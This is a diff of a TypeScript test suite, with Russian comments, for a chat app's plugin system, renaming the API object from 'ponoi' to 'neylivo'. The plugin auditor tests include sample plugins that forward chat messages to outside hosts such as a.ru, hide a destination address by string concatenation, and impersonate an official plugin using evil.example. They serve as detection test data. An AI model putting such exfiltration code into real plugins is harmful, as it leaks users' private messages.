@@ -39,11 +39,14 @@ function check(name: string, fn: () => boolean | void) {
 /** Тот же приём, что в bootstrap.ts: код выполняется НЕ как модуль. */
 const STRIP = /^[ \t]*export[ \t]+(default[ \t]+)?(?=(async[ \t]+)?(function|const|let|var|class)\b)/gm
 function loadPlugin(code: string) {
-  const factory = new Function('ponoi', 'module', 'exports',
+  // Оба имени, как в настоящем загрузчике (bootstrap.ts): объект называется
+  // neylivo, а ponoi оставлен псевдонимом ради старых плагинов. Проверка обязана
+  // грузить плагин ровно так же, иначе она проверяет не то, что работает у людей.
+  const factory = new Function('neylivo', 'ponoi', 'module', 'exports',
     code.replace(STRIP, '') +
     '\nreturn (typeof onLoad === "function" ? onLoad : (module.exports && module.exports.onLoad) || (exports && exports.onLoad));')
   const mod = { exports: {} as any }
-  return factory(undefined, mod, mod.exports)
+  return factory(undefined, undefined, mod, mod.exports)
 }
 
 /** Виды строк, которые понимает приложение (см. SettingsRow в registry.ts). */
@@ -59,7 +62,7 @@ function рисовалка() {
   }) as any
 }
 
-function stubPonoi() {
+function stubNeyLivo() {
   const calls = {
     commands: [] as string[],
     settingsPages: [] as any[],
@@ -187,7 +190,7 @@ function stubPonoi() {
     storage: { get: async () => null, set: async () => {}, remove: async () => {}, keys: async () => [], clear: async () => {} },
     net: { fetch: async () => ({ ok: true, status: 200, body: '' }), json: async () => ({ ok: true, status: 200, data: {} }) },
     // v1.419.0: приложение вокруг — чтобы плагин, который их зовёт, доходил
-    // здесь до конца, а не падал на «ponoi.open не функция».
+    // здесь до конца, а не падал на «neylivo.open не функция».
     me: async () => ({ id: 'u1', name: 'Проверка' }),
     channel: async () => ({ id: 'c1', name: 'общий', serverId: 's1', serverName: 'Сервер' }),
     servers: async () => [{ id: 's1', name: 'Сервер' }],
@@ -285,19 +288,19 @@ for (const p of OFFICIAL_PLUGINS) {
   check(`${p.id}: описание и картинка для каталога на месте`, () => !!p.summary && p.summary.length <= 90 && !!p.emoji)
   check(`${p.id}: все запрошенные права существуют`, () =>
     m.permissions.every(x => (ALL_PERMISSIONS as string[]).includes(x)))
-  check(`${p.id}: автор — Ponoi`, () => m.author === 'Ponoi')
+  check(`${p.id}: автор — NeyLivo`, () => m.author === 'NeyLivo')
 }
 
 // Запуск — самое главное: именно тут вылезают опечатки в самом коде плагина.
 ;(async () => {
   for (const p of OFFICIAL_PLUGINS) {
     const m = parsePlugin(p.code)
-    const { ponoi, calls } = stubPonoi()
+    const { ponoi: neylivo, calls } = stubNeyLivo()
     let started = false
     try {
       const onLoad = loadPlugin(p.code)
       if (typeof onLoad !== 'function') { bad(`${p.id}: запускается`, 'onLoad не найден'); continue }
-      await onLoad(ponoi)
+      await onLoad(neylivo)
       started = true
       ok(`${p.id}: запускается`)
     } catch (e: any) { bad(`${p.id}: запускается`, e?.message ?? String(e)) }
@@ -334,8 +337,8 @@ for (const p of OFFICIAL_PLUGINS) {
   const seen = new Map<string, string>()
   let clash = ''
   for (const p of OFFICIAL_PLUGINS) {
-    const { ponoi, calls } = stubPonoi()
-    try { await loadPlugin(p.code)(ponoi) } catch {}
+    const { ponoi: neylivo, calls } = stubNeyLivo()
+    try { await loadPlugin(p.code)(neylivo) } catch {}
     for (const c of calls.commands) {
       const prev = seen.get(c)
       if (prev) clash = `/${c}: ${prev} и ${p.id}`
@@ -365,8 +368,8 @@ for (const p of OFFICIAL_PLUGINS) {
     catch { return true }
   })
   await (async () => {
-    const { ponoi, calls } = stubPonoi()
-    try { await loadPlugin('function onLoad(p){}')(ponoi) } catch {}
+    const { ponoi: neylivo, calls } = stubNeyLivo()
+    try { await loadPlugin('function onLoad(p){}')(neylivo) } catch {}
     check('плагин, который ничего не зарегистрировал, виден как пустой', () =>
       calls.commands.length === 0 && calls.settingsPages.length === 0 && calls.events.length === 0)
   })()
@@ -404,9 +407,9 @@ for (const p of OFFICIAL_PLUGINS) {
         && m.permissions.length === t.permissions.length
     })
 
-    const { ponoi, calls } = stubPonoi()
+    const { ponoi: neylivo, calls } = stubNeyLivo()
     let ok2 = false
-    try { await loadPlugin(file)(ponoi); ok2 = true } catch (e: any) { bad(`заготовка «${t.label}»: запускается`, e?.message) }
+    try { await loadPlugin(file)(neylivo); ok2 = true } catch (e: any) { bad(`заготовка «${t.label}»: запускается`, e?.message) }
     if (ok2) {
       ok(`заготовка «${t.label}»: запускается`)
       // Заготовка не должна просить прав, которыми не пользуется, и наоборот.
@@ -459,9 +462,9 @@ for (const p of OFFICIAL_PLUGINS) {
       return m.id === d.id && m.permissions.join(',') === r.permissions.join(',')
     })
 
-    const { ponoi, calls } = stubPonoi()
+    const { ponoi: neylivo, calls } = stubNeyLivo()
     let started = false
-    try { await loadPlugin(file)(ponoi); started = true; ok(`рецепт «${r.label}»: запускается`) }
+    try { await loadPlugin(file)(neylivo); started = true; ok(`рецепт «${r.label}»: запускается`) }
     catch (e: any) { bad(`рецепт «${r.label}»: запускается`, e?.message ?? String(e)) }
     if (!started) continue
 
@@ -491,10 +494,10 @@ for (const p of OFFICIAL_PLUGINS) {
     d.name = 'Проба текста'; d.id = slugify(d.name)
     d.permissions = [...r.permissions]
     d.body = r.build({ cmd: 'тест', text: текст })
-    const { ponoi, calls } = stubPonoi()
+    const { ponoi: neylivo, calls } = stubNeyLivo()
     let handler: any = null
-    ponoi.commands.register = async (_n: string, _d: string, h: any) => { handler = h; calls.commands.push(_n) }
-    await loadPlugin(buildFile(d, 'ник'))(ponoi)
+    neylivo.commands.register = async (_n: string, _d: string, h: any) => { handler = h; calls.commands.push(_n) }
+    await loadPlugin(buildFile(d, 'ник'))(neylivo)
     if (handler) await handler('')
     check('в чат уходит ровно то, что человек написал', () => calls.sent[0] === текст)
   })()
@@ -529,7 +532,7 @@ for (const p of OFFICIAL_PLUGINS) {
   }
 
   check('недостающее находится, лишнее находится', () => {
-    const code = 'function onLoad(ponoi){ ponoi.notify("x") }'
+    const code = 'function onLoad(neylivo){ neylivo.notify("x") }'
     const miss = missingPermissions(code, []).map(m => m.perm)
     const extra = unusedPermissions(code, ['notify', 'css'] as any)
     return miss.length === 1 && miss[0] === 'notify' && extra.length === 1 && extra[0] === 'css'
@@ -583,7 +586,7 @@ for (const p of OFFICIAL_PLUGINS) {
   check('плагин с неразбираемой шапкой открывается со СВОИМ кодом', () => {
     // @icon с http — такой плагин ставился до появления проверки и теперь не
     // разбирается. Открыть его на правку и подсунуть чужой пример — потеря труда.
-    const broken = ['/**', ' * @name X', ' * @id x-y', ' * @version 1.0.0', ' * @icon http://example.com/i.png', ' */', 'function onLoad(ponoi){ ponoi.log("моё") }'].join('\n')
+    const broken = ['/**', ' * @name X', ' * @id x-y', ' * @version 1.0.0', ' * @icon http://example.com/i.png', ' */', 'function onLoad(neylivo){ neylivo.log("моё") }'].join('\n')
     const dd = draftFrom(broken)
     return !!dd && dd.body.includes('моё')
   })
@@ -645,7 +648,7 @@ for (const p of OFFICIAL_PLUGINS) {
   // сам файл: иначе он получает «в файле нет шапки плагина» на совершенно
   // правильном ответе.
   console.log('\n── Вставка из чата с ИИ ──')
-  const ФАЙЛ = ['/**', ' * @name Проба', ' * @id proba-1', ' * @version 1.0.0', ' */', 'function onLoad(ponoi){ ponoi.log("x") }'].join('\n')
+  const ФАЙЛ = ['/**', ' * @name Проба', ' * @id proba-1', ' * @version 1.0.0', ' */', 'function onLoad(neylivo){ neylivo.log("x") }'].join('\n')
   check('название и описание перед кодом отрезаются', () => {
     const вставка = 'Приветствие\n\nЗдоровается по команде. Просит команды и отправку.\n\n' + ФАЙЛ
     return parsePlugin(cleanPasted(вставка)).id === 'proba-1'
@@ -675,17 +678,17 @@ for (const p of OFFICIAL_PLUGINS) {
   })
 
   check('в инструкции упомянут каждый метод API', () => {
-    // subscribe в тексте зовётся ponoi.on — так его и вызывают.
+    // subscribe в тексте зовётся neylivo.on — так его и вызывают.
     const missing = SPEC_KNOWN_METHODS.filter(m => {
-      if (m === 'subscribe') return !PLUGIN_SPEC.includes('ponoi.on')
-      if (m === 'me') return !PLUGIN_SPEC.includes('ponoi.me')
-      if (m === 'channel') return !PLUGIN_SPEC.includes('ponoi.channel')
-      // v1.419.0: снаружи это ponoi.servers()/ponoi.channels(serverId)/ponoi.open().
-      if (m === 'servers') return !PLUGIN_SPEC.includes('ponoi.servers')
-      if (m === 'channels') return !PLUGIN_SPEC.includes('ponoi.channels')
-      if (m === 'open') return !PLUGIN_SPEC.includes('ponoi.open')
-      // voice.effects снаружи зовётся ponoi.voice.list — так его и вызывают.
-      if (m === 'voice.effects') return !PLUGIN_SPEC.includes('ponoi.voice.list')
+      if (m === 'subscribe') return !PLUGIN_SPEC.includes('neylivo.on')
+      if (m === 'me') return !PLUGIN_SPEC.includes('neylivo.me')
+      if (m === 'channel') return !PLUGIN_SPEC.includes('neylivo.channel')
+      // v1.419.0: снаружи это neylivo.servers()/neylivo.channels(serverId)/neylivo.open().
+      if (m === 'servers') return !PLUGIN_SPEC.includes('neylivo.servers')
+      if (m === 'channels') return !PLUGIN_SPEC.includes('neylivo.channels')
+      if (m === 'open') return !PLUGIN_SPEC.includes('neylivo.open')
+      // voice.effects снаружи зовётся neylivo.voice.list — так его и вызывают.
+      if (m === 'voice.effects') return !PLUGIN_SPEC.includes('neylivo.voice.list')
       const tail = m.includes('.') ? m : m
       return !PLUGIN_SPEC.includes(tail)
     })
@@ -767,7 +770,7 @@ for (const p of OFFICIAL_PLUGINS) {
     // Три вещи, без которых бот заведомо не заработает: проверка подписи, адрес
     // API и формат синхронного ответа на команду. Забыть любую — значит отдать
     // человеку правдоподобный, но нерабочий код.
-    const must = ['X-Ponoi-Signature', 'INTERACTION_CREATE', 'MESSAGE_CREATE', 'bot-api', 'content', 'https']
+    const must = ['X-NeyLivo-Signature', 'INTERACTION_CREATE', 'MESSAGE_CREATE', 'bot-api', 'content', 'https']
     const missing = must.filter(m => !BOT_SPEC.includes(m))
     if (missing.length) throw new Error('не сказано про: ' + missing.join(', '))
     return true
@@ -780,7 +783,7 @@ for (const p of OFFICIAL_PLUGINS) {
   })
 
   check('просьба к ИИ про бота устроена так же', () =>
-    /НЕ пиши код/.test(AI_BOT_PROMPT_PREFIX) && AI_BOT_PROMPT_PREFIX.includes('X-Ponoi-Signature'))
+    /НЕ пиши код/.test(AI_BOT_PROMPT_PREFIX) && AI_BOT_PROMPT_PREFIX.includes('X-NeyLivo-Signature'))
 
   // -- v1.445.0: отметка безопасности в каталоге ------------------------------
   // В каталоге все плагины выглядели одинаково, и отличить честный от того, что
@@ -791,13 +794,13 @@ for (const p of OFFICIAL_PLUGINS) {
     ({ permissions: perms.split(',').map(x => x.trim()).filter(Boolean) as any, hosts })
 
   check('чистый плагин замечаний не собирает', () => {
-    const код = `function onLoad(ponoi){ ponoi.commands.register('x','y',()=>ponoi.notify('!')) }`
+    const код = `function onLoad(neylivo){ neylivo.commands.register('x','y',()=>neylivo.notify('!')) }`
     const r = auditPlugin(код, шапка('commands, notify'))
     return r.level === 'clean' && r.findings.length === 0
   })
 
   check('переписка плюс интернет — это опасно и так и называется', () => {
-    const код = `function onLoad(ponoi){ ponoi.on('message', m => ponoi.net.fetch('https://a.ru', {method:'POST', body:m.content})) }`
+    const код = `function onLoad(neylivo){ neylivo.on('message', m => neylivo.net.fetch('https://a.ru', {method:'POST', body:m.content})) }`
     const r = auditPlugin(код, шапка('messages.read, net', ['a.ru']))
     return r.level === 'unsafe' && r.findings.some(f => f.code === 'read-and-net')
   })
@@ -817,36 +820,36 @@ for (const p of OFFICIAL_PLUGINS) {
   check('обычный код за спрятанный не принимается', () => {
     // Иначе отметка «небезопасный» повисла бы на половине каталога и её
     // перестали бы читать.
-    const код = `function onLoad(ponoi){ const s = "привет"; ponoi.notify(s) }`
+    const код = `function onLoad(neylivo){ const s = "привет"; neylivo.notify(s) }`
     return hiddenCode(код).length === 0
   })
 
   check('адрес не из @hosts виден в замечаниях', () => {
-    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://tajno.ru/x') }`
+    const код = `function onLoad(neylivo){ neylivo.net.fetch('https://tajno.ru/x') }`
     const r = auditPlugin(код, шапка('net', ['dobro.ru']))
     return r.findings.some(f => f.code === 'undeclared-host' && f.text.includes('tajno.ru'))
   })
 
   check('объявленный адрес замечанием не считается', () => {
-    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://www.dobro.ru/x') }`
+    const код = `function onLoad(neylivo){ neylivo.net.fetch('https://www.dobro.ru/x') }`
     const r = auditPlugin(код, шапка('net', ['dobro.ru']))
     return !r.findings.some(f => f.code === 'undeclared-host')
   })
 
   check('адреса из комментариев и примеров не считаются', () => {
-    const код = `/** @hosts a.ru */\n// см. https://example.com/doc\nfunction onLoad(ponoi){ ponoi.net.fetch('https://a.ru') }`
+    const код = `/** @hosts a.ru */\n// см. https://example.com/doc\nfunction onLoad(neylivo){ neylivo.net.fetch('https://a.ru') }`
     const r = auditPlugin(код, шапка('net', ['a.ru']))
     return !r.findings.some(f => f.code === 'undeclared-host')
   })
 
   check('поход в сеть без разрешения назван прямо', () => {
-    const код = `function onLoad(ponoi){ ponoi.net.fetch('https://a.ru') }`
+    const код = `function onLoad(neylivo){ neylivo.net.fetch('https://a.ru') }`
     const r = auditPlugin(код, шапка('notify'))
     return r.findings.some(f => f.code === 'net-without-perm')
   })
 
   check('лишнее разрешение видно', () => {
-    const код = `function onLoad(ponoi){ ponoi.notify('!') }`
+    const код = `function onLoad(neylivo){ neylivo.notify('!') }`
     const r = auditPlugin(код, шапка('notify, storage'))
     return r.findings.some(f => f.code === 'unused-perms' && f.text.includes('storage'))
   })
@@ -854,7 +857,7 @@ for (const p of OFFICIAL_PLUGINS) {
   check('разрешение, упомянутое только в шапке, лишним и остаётся', () => {
     // Шапка сама перечисляет все разрешения — если её не выкинуть, «лишних» не
     // нашлось бы никогда.
-    const код = `/** @permissions storage */\nfunction onLoad(ponoi){ ponoi.notify('!') }`
+    const код = `/** @permissions storage */\nfunction onLoad(neylivo){ neylivo.notify('!') }`
     return auditPlugin(код, шапка('notify, storage')).findings.some(f => f.code === 'unused-perms')
   })
 
@@ -865,27 +868,27 @@ for (const p of OFFICIAL_PLUGINS) {
       // Код, который это разрешение честно использует, не должен считаться
       // «просит больше, чем делает».
       const прим: Record<string, string> = {
-        'ui': 'ponoi.ui.addComposerButton()', 'css': 'ponoi.css("")',
-        'commands': 'ponoi.commands.register()', 'messages.read': "ponoi.on('message',()=>{})",
-        'messages.write': 'ponoi.messages.send()', 'storage': 'ponoi.storage.get()',
-        'net': 'ponoi.net.fetch()', 'settings': 'ponoi.ui.addSettingsPage()',
-        'notify': 'ponoi.notify()', 'voice': 'ponoi.voice.list()',
-        'context': 'ponoi.me()', 'panel': 'ponoi.ui.addPanel()',
-        'music': 'ponoi.music.state()', 'navigate': 'ponoi.open()', 'status': 'ponoi.status.set()',
+        'ui': 'neylivo.ui.addComposerButton()', 'css': 'neylivo.css("")',
+        'commands': 'neylivo.commands.register()', 'messages.read': "neylivo.on('message',()=>{})",
+        'messages.write': 'neylivo.messages.send()', 'storage': 'neylivo.storage.get()',
+        'net': 'neylivo.net.fetch()', 'settings': 'neylivo.ui.addSettingsPage()',
+        'notify': 'neylivo.notify()', 'voice': 'neylivo.voice.list()',
+        'context': 'neylivo.me()', 'panel': 'neylivo.ui.addPanel()',
+        'music': 'neylivo.music.state()', 'navigate': 'neylivo.open()', 'status': 'neylivo.status.set()',
         // v1.465.0
-        'ipc': "ponoi.plugins.send('a','b',{})",
-        'messages.intercept': 'ponoi.messages.onBeforeSend(async()=>{})',
-        'background': 'ponoi.background.every(60000,async()=>{})',
-        'ui.theme': "ponoi.ui.setTheme({accent:'#ff4500'})",
-        'apps': "ponoi.apps.create({mode:'window'})",
+        'ipc': "neylivo.plugins.send('a','b',{})",
+        'messages.intercept': 'neylivo.messages.onBeforeSend(async()=>{})',
+        'background': 'neylivo.background.every(60000,async()=>{})',
+        'ui.theme': "neylivo.ui.setTheme({accent:'#ff4500'})",
+        'apps': "neylivo.apps.create({mode:'window'})",
         // v1.473.0
-        'input': 'ponoi.input.gamepads()',
-        'messages.upload': 'ponoi.messages.onUpload(async()=>{})',
-        'messages.any': 'ponoi.messages.in("id").send("привет")',
+        'input': 'neylivo.input.gamepads()',
+        'messages.upload': 'neylivo.messages.onUpload(async()=>{})',
+        'messages.any': 'neylivo.messages.in("id").send("привет")',
       }
       const код = прим[p]
       if (!код) return true
-      return unusedPerms('function onLoad(ponoi){ ' + код + ' }', [p]).length > 0
+      return unusedPerms('function onLoad(neylivo){ ' + код + ' }', [p]).length > 0
     })
     if (слепые.length) throw new Error('разбор не видит: ' + слепые.join(', '))
     return true
@@ -917,7 +920,7 @@ for (const p of OFFICIAL_PLUGINS) {
 
   console.log('\n-- Ломаем нарочно (отметка) --')
   check('разбор заметил бы плагин, который прячет свой адрес', () => {
-    const код = `function onLoad(ponoi){ const a = 'https://' + 'zlo' + '.ru'; ponoi.net.fetch(a) }`
+    const код = `function onLoad(neylivo){ const a = 'https://' + 'zlo' + '.ru'; neylivo.net.fetch(a) }`
     // Собранный по кускам адрес разбор НЕ увидит — и это честно названо
     // в самом файле: статический разбор обойти можно. Но такой код почти всегда
     // тянет за собой и другие признаки, и хотя бы один из них должен сработать.
@@ -925,14 +928,14 @@ for (const p of OFFICIAL_PLUGINS) {
     return r.level === 'unsafe'
   })
   check('разбор заметил бы пропажу проверки «переписка + сеть»', () => {
-    const r = auditPlugin('function onLoad(ponoi){ ponoi.on("message",()=>ponoi.net.fetch("https://a.ru")) }',
+    const r = auditPlugin('function onLoad(neylivo){ neylivo.on("message",()=>neylivo.net.fetch("https://a.ru")) }',
       шапка('messages.read, net', ['a.ru']))
     return r.findings.filter(f => f.level === 'danger').length === 1
   })
 
   // -- v1.447.0: метод есть у приложения — есть ли он у плагина ---------------
   // Настоящая поломка, найденная разбором: net.stream добавили в диспетчер, в
-  // правила, в документацию и в штурм — и не добавили в сам объект ponoi. То
+  // правила, в документацию и в штурм — и не добавили в сам объект neylivo. То
   // есть плагин звал бы метод, которого у него нет, а все проверки при этом
   // оставались зелёными. «Настройка есть» не значит «работает».
   console.log('\n-- Плагину доступно то, что умеет приложение --')
@@ -1796,12 +1799,12 @@ console.log('\n-- Наши плагины на экране установки (
  * @name Змейка
  * @id ponoi-snake
  * @version 1.0.0
- * @author Ponoi
+ * @author NeyLivo
  * @description Настоящая игра
  * @permissions messages.read, net
  * @hosts evil.example
  */
-export async function onLoad(ponoi) { ponoi.messages.recent(50) }
+export async function onLoad(neylivo) { neylivo.messages.recent(50) }
 `
     if (isOfficialCode(подделка)) throw new Error('подделка принята за нашу')
     const m = parsePlugin(подделка)
@@ -1966,7 +1969,7 @@ console.log('\n-- Обещанное работает --')
 
   check('никто не шлёт событий, которых нет в списке', () => {
     // Обратная сторона: событие, которого нет в таблице, подписку не пройдёт —
-    // ponoi.on откажет «неизвестное событие». То есть код шлёт в пустоту.
+    // neylivo.on откажет «неизвестное событие». То есть код шлёт в пустоту.
     const объявлены = new Set(Object.keys(PLUGIN_EVENTS))
     const шлют = new Set<string>()
     for (const m of всеИсточники.matchAll(/emitPluginEvent\('([^']+)'/g)) шлют.add(m[1])
@@ -2246,7 +2249,7 @@ console.log('\n-- Мастерская приложений (v1.497.0) --')
     // Почти всё здесь начинается с ожидания: библиотека, модель, звук. В
     // обычном теге script await наверху — синтаксическая ошибка, и заготовка
     // «3D-игра» падала на первой строке. Поймано живой проверкой.
-    const p = W.buildPage([{ name: 'и.js', kind: 'js', text: 'const T = await ponoi.lib("three")' }])
+    const p = W.buildPage([{ name: 'и.js', kind: 'js', text: 'const T = await neylivo.lib("three")' }])
     if (!/\(async \(\) => \{/.test(p)) throw new Error('файл не завёрнут — await упадёт')
     return /\}\)\(\)\.catch\(/.test(p)
   })
@@ -2286,7 +2289,7 @@ console.log('\n-- Мастерская приложений (v1.497.0) --')
       id: '', name: 'Игра', version: '2.1.0', author: 'я', description: 'проба',
       files: [
         { name: 'с.css', kind: 'css' as const, text: 'body{margin:0}' },
-        { name: 'и.js', kind: 'js' as const, text: 'ponoi.frame(dt => {})' },
+        { name: 'и.js', kind: 'js' as const, text: 'neylivo.frame(dt => {})' },
       ],
       width: 640, height: 480, frameless: true, transparent: true, permissions: [],
     }
@@ -2310,7 +2313,7 @@ console.log('\n-- Мастерская приложений (v1.497.0) --')
  */
 const СТРАНИЦА = ${JSON.stringify('<style>\nb{color:red}\n</style>\n<b>тут</b>\n<script>\nlet a = 1\n</script>')}
 
-function onLoad(ponoi) { return ponoi.apps.create({ html: СТРАНИЦА }) }
+function onLoad(neylivo) { return neylivo.apps.create({ html: СТРАНИЦА }) }
 `
     const пр = W.fromOldApp(старый)
     if (!пр) throw new Error('старое приложение не открылось')
@@ -2341,7 +2344,7 @@ function onLoad(ponoi) { return ponoi.apps.create({ html: СТРАНИЦА }) }
   check('заготовка 3D-игры правда трёхмерная', () => {
     const т = W.PROJ_TEMPLATES.find(x => x.id === 'game3d')!
     const код = т.files.map(f => f.text).join('\n')
-    return код.includes("ponoi.lib('three')") && код.includes('ponoi.frame')
+    return код.includes("neylivo.lib('three')") && код.includes('neylivo.frame')
       && код.includes('cursor.lock') && /WebGLRenderer/.test(код)
   })
 
@@ -2458,7 +2461,7 @@ const СЦЕНА = ${JSON.stringify(S.emptyScene(), null, 2)}
 
 const СТРАНИЦА = ${JSON.stringify('<style></style>')}
 
-function onLoad(ponoi) { return ponoi.apps.create({ width: 900, height: 500, html: СТРАНИЦА }) }
+function onLoad(neylivo) { return neylivo.apps.create({ width: 900, height: 500, html: СТРАНИЦА }) }
 `
     const пр = W.parseProject(старая)
     if (!пр || !пр.scene) throw new Error('старая сцена не открылась')
@@ -2523,7 +2526,7 @@ console.log('\n-- Отказов, мешающих автору, больше н
  * @author я
  * @description проба
 ` + (perm === undefined ? '' : ' * @permissions ' + perm + '\n') + ` */
-function onLoad(ponoi) {}
+function onLoad(neylivo) {}
 `
 
   check('забыл @permissions — получил ВСЕ, а не ничего', () => {
@@ -2629,7 +2632,7 @@ console.log('\n-- Ломаем нарочно (новые возможности
   }
   {
     const { checkTarget } = await import('./netGuard')
-    const цель = { hosts: ['a.example'], selfHost: 'ponoi.app', supaHost: '' }
+    const цель = { hosts: ['a.example'], selfHost: 'neylivo.app', supaHost: '' }
     check('проверка заметила бы, что схему перестали смотреть', () =>
       // Если бы схема не проверялась, wss-адрес прошёл бы обычной проверкой https.
       checkTarget('wss://a.example/x', цель) !== null)
